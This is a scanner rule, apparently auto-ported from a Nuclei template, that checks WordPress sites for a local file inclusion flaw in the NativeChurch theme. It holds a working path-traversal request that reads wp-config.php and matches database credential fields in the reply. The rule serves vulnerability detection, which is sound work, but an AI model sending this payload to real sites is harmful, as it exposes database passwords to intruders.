schema_version: 1
id: "cortex.community:nativechurch-wp-theme-lfd"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "WordPress NativeChurch Theme - Local File Inclusion"
  description: "WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://packetstormsecurity.com/files/132297/WordPress-NativeChurch-Theme-1.0-1.5-Arbitrary-File-Download.html"
    - "https://wpscan.com/vulnerability/2e1062ed-0c48-473f-aab2-20ac9d4c72b1"
  cwes: [23]
  tags: ["wp-theme", "lfi", "wp", "packetstorm", "wpscan", "wordpress", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_HOST" } }
      - contains: { left: { ref: "steps.probe0.body" }, right: { value: "The base configurations of the WordPress" } }
